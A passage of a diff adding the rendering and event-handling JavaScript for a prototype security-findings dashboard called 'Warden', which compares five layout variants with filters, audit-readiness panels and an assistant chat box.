+   <div class="A-filters" role="group" aria-label="Filter">${["Open","Accepted","Fixed","False positive","all"].map(s=>`<button data-status="${s}" aria-pressed="${state.status===s}">${s==="all"?"Every status":s}</button>`).join("")}
+     <span class="muted">|</span>${["all","Critical","High","Medium","Low"].map(s=>`<button data-sev="${s}" aria-pressed="${state.sev===s}">${s==="all"?"Any severity":s}</button>`).join("")}</div>
+   <table><thead><tr><th>Severity</th><th>Finding</th><th>Asset</th><th>Status</th><th>Age</th></tr></thead><tbody>
+   ${viewed().map(f=>`<tr><td class="sev sev-${f.sev}">${f.sev}</td><td>${f.title}<div class="muted mono">${f.rule}</div></td><td>${f.asset}<div class="muted" style="font-size:12px">${f.kind}</div></td>
+     <td>${f.status}${f.unconfirmed?` <span class="flag">Unconfirmed fix</span>`:""}</td><td class="muted">${f.age}</td></tr>`).join("") || `<tr><td colspan="5" class="muted">Nothing matches this view.</td></tr>`}
+   </tbody></table>
+   <h2>Are we ready for the audit?</h2>
+   <div class="A-audit"><div>VDA ISA2027 · 3 Controls checked so far · <b>not yet ready</b></div>
+     <dl>${AUDIT.map(a=>`<dt><b>${a.c}</b></dt><dd>${a.q} — <i>${a.v}</i>. <span class="muted">${a.why}</span></dd>`).join("")}</dl></div>
+   <div class="A-ask"><header>Ask Warden</header>${chatHTML("e.g. show only high")}</div>
+  </div>`;
+}
+
+// ---------- Variant B: Calm console ----------
+function B(){
+  const v = viewed(); const s = FINDINGS.find(f=>f.id===state.sel) || v[0];
+  const count = st => FINDINGS.filter(f=>f.status===st).length;
+  return `<div class="B-app">
+   <nav class="B-nav"><div class="brand">WARDEN</div>
+     <a class="on" href="#">Findings <span>${count("Open")}</span></a><a href="#">Scans</a><a href="#">Agent sessions <span>44</span></a><a href="#">Products</a><a href="#">Evidence</a><a href="#">Settings</a>
+     <div class="level">${TEAM}<br>Level: Standard · Privacy tier: Details</div></nav>
+   <main class="B-main">
+     <div class="B-kpis"><div>Open<b>${count("Open")}</b></div><div>Critical<b class="sev-Critical">${open().filter(f=>f.sev==="Critical").length}</b></div><div>Fix rate, 30 d<b>62%</b></div><div>Sessions judged<b>41/44</b></div></div>
+     <div class="B-bar">${["Open","Accepted","Fixed","False positive","all"].map(st=>`<span class="chip" tabindex="0" data-status="${st}" aria-pressed="${state.status===st}">${st==="all"?"any status":st}</span>`).join("")}
+       ${["all","Critical","High","Medium","Low"].map(x=>`<span class="chip" tabindex="0" data-sev="${x}" aria-pressed="${state.sev===x}">${x==="all"?"any sev":x}</span>`).join("")}
+       ${["all","Guard","Patch"].map(x=>`<span class="chip" tabindex="0" data-module="${x}" aria-pressed="${state.module===x}">${x==="all"?"any module":x}</span>`).join("")}
+       <span class="B-url">/${viewText()}</span></div>
+     <table><thead><tr><th>Sev</th><th>ID</th><th>Finding</th><th>Asset</th><th>Rule</th><th>Status</th></tr></thead><tbody>
+     ${v.map(f=>`<tr class="row ${f.id===s?.id?"sel":""}" data-sel="${f.id}"><td class="sev sev-${f.sev}">${f.sev}</td><td class="mono muted" style="white-space:nowrap">${f.id}</td><td>${f.title}</td>
+       <td class="mono">${f.asset}</td><td class="mono muted">${f.rule}</td><td>${f.status}${f.unconfirmed?` <span class="flag">unconfirmed</span>`:""}</td></tr>`).join("") || `<tr><td colspan="6" class="muted">Nothing matches this view.</td></tr>`}
+     </tbody></table></main>
+   <aside class="B-side">
+     <div class="B-detail">${s?`<div class="muted mono">${s.id} · ${s.module} · ${s.kind}</div><h3 style="margin:4px 0 6px">${s.title}</h3>
+       <div><span class="sev sev-${s.sev}">${s.sev}</span> · ${s.status} · ${s.age} · ${s.control}</div>
+       <p>${s.plain}</p><div class="muted" style="font-size:12px">Evidence (masked)</div><pre>${s.evidence}</pre>
+       <div style="display:flex;gap:6px;flex-wrap:wrap">${s.fixPR?`<button class="btn">Open fix PR</button>`:""}<button class="btn ghost">Accept…</button><button class="btn ghost">False positive…</button></div>`:""}</div>
+     <div class="B-chat">${chatHTML("show only high, just Patch, …")}</div>
+   </aside></div>`;
+}
+
+// ---------- Variant C: Friendly guide ----------
+function C(){
+  const t = top5();
+  return `<div class="C-wrap">
+   <p class="C-hello">Good morning, ${TEAM} 👋</p>
+   <p class="muted" style="margin:4px 0 0">You're keeping your AI agents safe. Here's where you are, and what to do next.</p>
+   <div class="C-steps">
+     <div class="C-step"><b>1 · Quick</b><small>Repo scan, top fixes</small><div class="bar"><i style="width:100%"></i></div><small style="margin-top:6px">Done</small></div>
+     <div class="C-step now"><b>2 · Standard</b><small>Agent hook and the Judge are on</small><div class="bar"><i style="width:55%"></i></div><small style="margin-top:6px">Next: turn the hook on for ota-updater</small></div>
+     <div class="C-step"><b>3 · Audit-ready</b><small>Evidence for VDA ISA2027</small><div class="bar"><i style="width:15%"></i></div><small style="margin-top:6px">3 Controls partly evidenced</small></div>
+   </div>
+   <h2 style="font-family:var(--font-head);margin:0 0 12px">Fix these 5 first</h2>
+   <div class="C-cards">${t.map((f,i)=>`<div class="C-card"><div><span class="C-pill sev-${f.sev}">${f.sev}</span> <span class="tag">#${i+1} · ${f.asset}</span></div>
+      <h3>${f.title}</h3><div>${f.plain}</div><div class="tag">What to do: ${f.fix}</div>
+      <div class="actions">${f.fixPR?`<button class="btn">Fix it for me</button>`:`<button class="btn">Review</button>`}<button class="btn ghost">Why?</button></div></div>`).join("")}</div>
+   <details class="C-more"><summary>All findings (${viewed().length} shown)</summary>
+     <div style="display:flex;gap:6px;flex-wrap:wrap;margin:6px 0">${["Open","Accepted","Fixed","False positive","all"].map(s=>`<button class="btn ghost" data-status="${s}" aria-pressed="${state.status===s}" style="${state.status===s?"border-color:var(--accent)":""}">${s==="all"?"Everything":s}</button>`).join("")}</div>
+     <table><thead><tr><th>How bad</th><th>What</th><th>Where</th><th>Status</th></tr></thead><tbody>
+     ${viewed().map(f=>`<tr><td><span class="C-pill sev-${f.sev}">${f.sev}</span></td><td>${f.title}</td><td>${f.asset}</td><td>${f.status}${f.unconfirmed?` <span class="flag">check the fix</span>`:""}</td></tr>`).join("") || `<tr><td colspan="4" class="muted">Nothing here.</td></tr>`}
+     </tbody></table></details>
+   <div class="C-buddy"><header>Warden assistant</header>${chatHTML("Ask me anything…")}</div>
+  </div>`;
+}
+
+// ---------- render + wiring ----------
+const NAMES = {A:"Quiet ledger", B:"Calm console", C:"Friendly guide", D:"Combined", E:"Combined, friendlier"};
+function E(){
+  let html = state.page==="overview" ? D_overview() : D();
+  const det = (html.match(/<div class="D-detail[^"]*">([\s\S]*?)<\/div>\s*<div class="D-chat">/)||[])[1] || "";
+  html = html.replace(/<aside class="D-side">[\s\S]*<\/aside>/, "");
+  html = html.replace(/<dt><b>([\d.]+)<\/b><\/dt><dd>/g, (m,c)=>`<dt class="ctl-row ${state.ctl===c?"sel":""}" data-ctl="${c}"><b>${c}</b></dt><dd class="ctl-row ${state.ctl===c?"sel":""}" data-ctl="${c}">`);
+  let detail = "";
+  if (state.page==="overview") {
+    const a = AUDIT.find(x=>x.c===state.ctl);
+    if (a) { const fs = FINDINGS.filter(f=>f.control==="ISA2027 "+a.c);
+      detail = `<div class="D-detail"><div class="muted mono">VDA ISA2027 · Control ${a.c}</div><h3>${a.q}</h3>
+        <div>Verdict: <i>${a.v}</i> · reviewed by nobody yet</div><p class="muted">${a.why}</p>
+        <div class="muted" style="font-size:12px">Findings behind this Verdict</div>
+        <ul class="E-ctl-list">${fs.map(f=>`<li data-page="findings" data-sel="${f.id}"><span class="pill sev sev-${f.sev}">${f.sev}</span> ${f.title} <span class="muted mono">${f.id}</span></li>`).join("")||`<li class="muted">None yet.</li>`}</ul></div>`; }
+  } else if (det && state.sel) detail = `<div class="D-detail">${det}</div>`;
+  if (detail) detail = detail.replace('<div class="D-detail">', '<div class="D-detail"><button class="E-unfocus" data-unfocus="1" aria-label="Clear the focus">✕</button>');
+  const pinned = state.panel==="pinned";
+  const panel = state.panel==="closed" ? `<button class="btn E-open" data-panel="floating">Ask Warden${state.chat.length?" · "+state.chat.length/2+" messages":""}</button>`
+    : `${pinned?`<div class="E-divider" role="separator" aria-orientation="vertical" aria-label="Resize the panel" tabindex="0"></div>`:""}
+       <aside class="E-panel ${state.panel}"><header><span class="t">Ask Warden</span>
+         <button class="icon" data-panel="${pinned?"floating":"pinned"}" aria-pressed="${pinned}" title="${pinned?"Unpin":"Pin beside the page"}">${pinned?"Pinned":"Pin"}</button>
+         <button class="icon" data-panel="closed" aria-label="Close the panel">✕</button></header>
+         <div class="E-body">${detail}<div class="D-chat">${chatHTML(state.page==="overview"?"are we ready for the audit?":"show only high, just Patch, …", true)}</div></div></aside>`;
+  return html.replace(/^<div class="D-app friendly">/, `<div class="D-app friendly E-app ${pinned?"pinned":""}" style="--pw:${state.pw}px">`).replace(/<\/div>\s*$/, panel+"</div>");
+}
+function D(){
+  if (state.page === "overview") return D_overview();
+  const fr = state.variant==="E"; const sv = (x)=> fr?`<span class="pill sev sev-${x}">${x}</span>`:`<span class="sev sev-${x}">${x}</span>`;
+  const t = top5(); const v = viewed(); const s = FINDINGS.find(f=>f.id===state.sel) || v[0];
+  return `<div class="D-app ${fr?"friendly":""}"><main class="D-main">
+   <div class="D-head"><h1>Findings</h1><div class="D-tabs"><button data-page="findings" aria-pressed="true">Findings</button><button data-page="overview" aria-pressed="false">Overview</button></div></div>
+   <div class="D-meta"><span>${TEAM}</span><span>Last Scan: today 09:14 · 6 Repos, 1 Product · 41 of 44 sessions judged</span><span>Level: Standard · <a data-page="overview">see the journey</a></span></div>
+   ${fr?`<p class="D-lede">${open().length} things need a look. Start with these five: they're the riskiest, and two of them also close audit Gaps.</p>`:""}
+   <h2>${fr?"Start here":"Fix these first"}</h2>
+   <div class="D-cards">${t.map((f,i)=>`<div class="D-card ${f.id===s?.id?"sel":""}" data-sel="${f.id}" tabindex="0"><div class="tag"><span class="n">${i+1}</span> &nbsp;${sv(f.sev)} · ${f.kind}</div>
+      <h3>${f.title}</h3>${fr?`<div style="font-size:13px">${f.plain.split(". ")[0].replace(/\.$/,"")}.</div>`:""}<div class="tag">${f.asset}</div><div class="tag">${fr?"What to do: ":""}${f.fix}</div>
+      <div class="actions">${f.fixPR?`<button class="btn ghost">Open fix PR</button>`:`<button class="btn ghost">Review</button>`}</div></div>`).join("")}</div>
+   <h2>All Findings</h2>
+   <div class="D-filters">${["Open","Accepted","Fixed","False positive","all"].map(x=>`<button data-status="${x}" aria-pressed="${state.status===x}">${x==="all"?"Every status":x}</button>`).join("")}
+     <span class="muted">|</span>${["all","Critical","High","Medium","Low"].map(x=>`<button data-sev="${x}" aria-pressed="${state.sev===x}">${x==="all"?"Any severity":x}</button>`).join("")}
+     <span class="muted">|</span>${["all","Guard","Patch"].map(x=>`<button data-module="${x}" aria-pressed="${state.module===x}">${x==="all"?"Any module":x}</button>`).join("")}
+     <span class="url">/${viewText()}</span></div>
+   <table><thead><tr><th>Severity</th><th>Finding</th><th>Asset</th><th>Status</th><th>Age</th></tr></thead><tbody>
+   ${v.map(f=>`<tr class="row ${f.id===s?.id?"sel":""}" data-sel="${f.id}"><td>${sv(f.sev)}</td><td>${f.title}<div class="muted mono">${f.rule}</div></td>
+     <td>${f.asset}<div class="muted" style="font-size:12px">${f.kind}</div></td><td>${f.status}${f.unconfirmed?` <span class="flag">Unconfirmed fix</span>`:""}</td><td class="muted">${f.age}</td></tr>`).join("") || `<tr><td colspan="5" class="muted">Nothing matches this view.</td></tr>`}
+   </tbody></table></main>
+   <aside class="D-side"><div class="D-detail">${s?`<div class="muted mono">${s.id} · ${s.module} · ${s.rule}</div><h3>${s.title}</h3>
+     <div><span class="sev sev-${s.sev}">${s.sev}</span> · ${s.status} · ${s.age} · ${s.control}</div><p>${s.plain}</p>
+     <div class="muted" style="font-size:12px">Evidence (masked)</div><pre>${s.evidence}</pre>
+     <div style="display:flex;gap:6px;flex-wrap:wrap">${s.fixPR?`<button class="btn">Open fix PR</button>`:""}<button class="btn ghost">Accept…</button><button class="btn ghost">False positive…</button></div>`:""}</div>
+     <div class="D-chat"><header>Ask Warden</header>${chatHTML("show only high, just Patch, …", true)}</div></aside></div>`;
+}
+function D_overview(){
+  return `<div class="D-app ${state.variant==="E"?"friendly":""}"><main class="D-main">
+   <div class="D-head"><h1>Overview</h1><div class="D-tabs"><button data-page="findings" aria-pressed="false">Findings</button><button data-page="overview" aria-pressed="true">Overview</button></div></div>
+   <div class="D-meta"><span>${TEAM}</span><span>For whoever answers "how far along are we?"</span></div>
+   <h2>Where ${TEAM} is</h2>
+   <div class="D-journey">
+     <div><b>Quick</b><small>Repo scan and top fixes</small><div class="bar"><i style="width:100%"></i></div><small style="margin-top:6px">Done · 6 Repos scanned weekly</small></div>
+     <div class="now"><b>Standard</b><small>Agent hook and the Judge</small><div class="bar"><i style="width:55%"></i></div><small style="margin-top:6px">Next: turn the hook on for ota-updater (F-107)</small></div>
+     <div><b>Audit-ready</b><small>Evidence for VDA ISA2027</small><div class="bar"><i style="width:15%"></i></div><small style="margin-top:6px">3 Controls checked, all partly evidenced</small></div></div>
+   <p class="A-lede" style="font-family:var(--font-head)">Open Findings went from 12 to 7 in 30 days; fix rate 62%.</p>
+   <h2>Are we ready for the audit?</h2>
+   <div class="A-audit"><div>VDA ISA2027 · 3 Controls checked so far · <b>not yet ready</b></div>
+     <dl>${AUDIT.map(a=>`<dt><b>${a.c}</b></dt><dd>${a.q} — <i>${a.v}</i>. <span class="muted">${a.why}</span></dd>`).join("")}</dl></div>
+   </main><aside class="D-side"><div class="D-detail muted">Select a Control to see its Findings and evidence.</div>
+     <div class="D-chat"><header>Ask Warden</header>${chatHTML("are we ready for the audit?", true)}</div></aside></div>`;
+}
+function render(){
+  document.documentElement.dataset.variant = state.variant; document.documentElement.dataset.theme = state.theme;
+  document.body.removeAttribute("style");
+  document.getElementById("app").innerHTML = ({A,B,C,D,E})[state.variant]();
+  document.getElementById("lbl").textContent = `${state.variant} (${NAMES[state.variant]}) · ${state.theme}`;
+  const log = document.getElementById("log"); if (log) log.scrollTop = log.scrollHeight;
+  pushURL();
+}
+document.addEventListener("click", e => {
+  const el = e.target.closest("[data-status],[data-sev],[data-module],[data-sel],[data-page],[data-panel],[data-ctl],[data-unfocus]"); if(!el) return;
+  if (el.dataset.unfocus) { if (state.page==="overview") state.ctl=null; else state.sel=null; render(); return; }
+  if (el.dataset.panel) { state.panel = el.dataset.panel; render(); return; }
+  if (el.dataset.ctl) { state.ctl = el.dataset.ctl; if (state.panel==="closed") state.panel="floating"; render(); return; }
+  if (el.dataset.page) state.page = el.dataset.page;
+  if (el.dataset.sel && state.variant==="E" && state.panel==="closed") state.panel = "floating";
+  if (el.dataset.status) state.status = el.dataset.status; if (el.dataset.sev) state.sev = el.dataset.sev;
+  if (el.dataset.module) state.module = el.dataset.module; if (el.dataset.sel) state.sel = el.dataset.sel; render();
+});
+document.addEventListener("submit", e => { if (e.target.id!=="chatf") return; e.preventDefault();
+  const v = document.getElementById("chatin").value.trim(); if(!v) return;
+  state.chat.push({who:"me", text:v.replace(/</g,"&lt;")}); state.chat.push({who:"bot", text:reply(v)}); render();
+  document.getElementById("chatin").focus(); });
+const order = ["A","B","C","D","E"];
+function step(d){ state.variant = order[(order.indexOf(state.variant)+d+5)%5]; state.theme = state.variant==="B"?"dark":"light"; render(); }
+document.getElementById("prev").onclick = () => step(-1);
+document.getElementById("next").onclick = () => step(1);
+document.getElementById("theme").onclick = () => { state.theme = state.theme==="light"?"dark":"light"; render(); };
+document.addEventListener("pointerdown", e => { const d = e.target.closest(".E-divider"); if (!d) return; e.preventDefault();
+  const app = document.querySelector(".E-app");
+  const move = ev => { state.pw = Math.min(680, Math.max(320, window.innerWidth - ev.clientX)); app.style.setProperty("--pw", state.pw+"px"); };
+  const up = () => { removeEventListener("pointermove", move); removeEventListener("pointerup", up); render(); };
+  addEventListener("pointermove", move); addEventListener("pointerup", up); });
+document.addEventListener("keydown", e => {
+  if (e.target.closest && e.target.closest(".E-divider")) {
+    if (e.key==="ArrowLeft") state.pw = Math.min(680, state.pw+24); else if (e.key==="ArrowRight") state.pw = Math.max(320, state.pw-24); else return;
+    e.preventDefault(); render(); document.querySelector(".E-divider")?.focus(); return; }
+  if (e.key==="Escape" && state.panel==="floating") { state.panel="closed"; render(); return; }
+  if (e.target.closest("input,textarea,[contenteditable]")) return;
+  if (e.key==="ArrowLeft") step(-1); if (e.key==="ArrowRight") step(1); if (e.key==="t") document.getElementById("theme").click(); });
+render();
+</script>
+</body>
+</html>
